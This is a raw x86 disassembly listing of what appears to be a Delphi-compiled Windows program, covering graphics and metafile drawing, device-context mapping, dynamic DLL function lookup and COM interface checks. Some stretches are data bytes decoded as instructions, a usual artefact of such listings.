mov eax [ eax + 0x1c ]
call sub_423768
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423768
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4237d0
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_47b9a1
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bae9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47baf0
lea eax [ ebp - 0x2c ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_4236b8
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047fc
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_40480c
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_42372c
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_4237d0
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423768
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_47c448
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b4d0
sub_47bb1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bb6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_405a4c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47b4d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb72
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47bb88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_47b444
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47bbc4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425b10
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bc32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_426758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bc39
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_47bc3d
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a4c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_47bcf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42a608
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42a63c
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403254
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_426728
call sub_42a88c
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_426740
call sub_4273ac
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427120
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47be05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d7c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426d94
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426dec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47bdd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_423f8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bde0
mov eax [ ebp - 0x18 ]
call sub_403254
retn
mov eax [ ebp - 0x8 ]
call sub_405a08
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_47c464
call sub_4794b8
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_47b4d0
sub_47bde0
mov eax [ ebp - 0x10 ]
call sub_427f3c
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403254
retn
sub_47be63
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
push ebx
mov ebx eax
mov eax ebx
call sub_47b4d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_47be98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41abc8
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_405a20
pop esi
pop ebx
retn
sub_47bed0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424164
xor eax eax
push ebp
push sub_47bfce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_424598
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_47c080
neg eax
push eax
mov eax ebx
call sub_47c09c
push eax
mov eax ebx
call sub_47c080
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4794b8
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42446c
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_47bfdc
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_47c008
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47c050
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47c080
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_419174
lea eax [ esp + 0x8 ]
mov edx esp
call sub_47c008
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_47c080
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_47c09c
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_47c0b8
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_47c0d4
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_47c0f4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47c09c
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_419174
lea eax [ esp + 0x8 ]
mov edx esp
call sub_47c008
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_47c138
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_47c176
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_47c120
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c17d
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_47c180
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_4794b8
sub_47c1a0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_47c1de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_47c120
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c1e5
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_47c1ec
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_405a08
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420abc
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_47c48c
call sub_4794b8
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_47c229
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c2a3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420abc
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_405a4c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4794b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c2aa
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub eax 0xffffffec
sub_47c2af
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47c2ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_47c120
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c306
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_47c30c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47c34b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_47c120
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c352
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_47c358
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d854
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_47c464
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_47c48c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405a7c
xor eax eax
push ebp
push sub_47c4eb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c4f2
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47c4fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47c551
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c558
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_47c624
in al 0xc5
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x47 ] ch
add [ eax + eax ] cl
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esi ] cl
push esp
inc ebp
jbe r-xdata
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_47cb3e
push eax
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub cl dl
inc edi
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ esi ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
inc esi
0x47
sub_47cbf6
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
int 0x47
add [ eax + 0x47cd ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x33 ] ah
inc edi
add [ eax + 0x680047cd ] ah
add al [ eax ]
add [ ebp + ebx * 2 + 0x44 ] al
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
fld [ edi ]
in al dx
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + edx * 8 + 0x47 ] dl
add al dh
adc al [ ebp ]
rcr cl 0x1
inc edi
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax + 0x30 ] 0x4c0047e3
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add ah ah
out dx eax
inc edi
add al ch
iretd
sub_47cc6a
inc edi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ eax ] bl
in al 0x47
add [ eax + 0x4c0044a1 ] ah
mov al [ 0xffffffffe9a80044 ]
inc edi
add ah dh
retn 0x44
sub_47ccb8
or al 0x6
inc ebp
add al cl
push es
inc ebp
add [ eax - 0x1e ] dl
inc edi
add [ esi + eax - 0x37f3ffbb ] ch
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0x2c ]
salc
inc esp
add [ eax ] ch
fld [ eax + eax + 0x74 ]
fadd [ edi ]
fcomp st4
inc esp
add ah bl
fadd [ eax + eax + 0x3c ]
fild [ edi ]
cmp al 0xdb
inc esp
add ah ch
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ edi - 0x200bffb9 ] ch
inc edi
add [ edx + ebp + 0x40 ] dl
add ah dl
loopne r-xdata
sbb [ ecx + 0x41 ] bh
add [ eax ] dh
add al [ eax ]
add [ edx ] cl
add [ eax + eax ] dl
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
[ eax - 0x47ffb815 ]
jmp r-xdata
add [ eax + 0x200047d9 ] ch
test [ edi ] sub_47f938
push cs
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0x18004178 ] dh
add al [ eax ]
add ah al
jns r-xdata
add [ eax ] cl
dec edi
insb
inc ebx
je r-xdata
sar edi 0x1
cwde
jmp r-xdata
add [ edx + eax ] bl
add [ eax ] al
nop
jns r-xdata
call sub_4137e0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a4c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_47b38c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ce84
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
insb
jae r-xdata
pushad
inc esp
add [ ebx ] cl
inc edi
add [ eax ] ch
in al dx
inc edi
add [ esp + ebp * 8 - 0x12f7ffb9 ] al
inc edi
add [ ebp + ebp * 8 - 0x116bffb9 ] dl
inc edi
add [ edi + ebp * 8 + 0x47 ] cl
add [ edi + ebp * 8 - 0x1f27ffb9 ] bl
inc edi
add [ ebx ] cl
push esp
dec edi
insb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] ah
add al [ eax ]
add ah ah
adc [ eax ] eax
and al 0x2
add [ eax ] al
add [ edx + 0x41 ] bh
add [ eax ] ch
add al [ eax ]
add [ eax + 0x79 ] bl
inc ecx
add [ edx + eax ] ch
add [ eax ] al
add [ ebx - 0x1374aa40 ] cl
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_47ce12
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_47b33c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ce19
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
retn
outsd
insb
mov al 0xcd
inc edi
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc ebx
outsd
outsb
je r-xdata
xor eax eax
push ebp
push sub_47ce7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
outsd
insb
cmp al 0xcc
inc edi
add al bh
sub_47cdd4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_47ce12
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_47b33c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ce19
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47ce20
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47ce7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4137e0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a4c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_47b38c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ce84
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_47ce9c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f550
mov eax esi
call sub_404dcc
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_47cee0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_403308
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_47cf37
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_47f00c
pop ebp
retn 0x4
sub_47cfa0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_47cfe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c4cc
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_41a770
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47cebc
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_47d65c
mov edx [ ebx + 0x218 ]
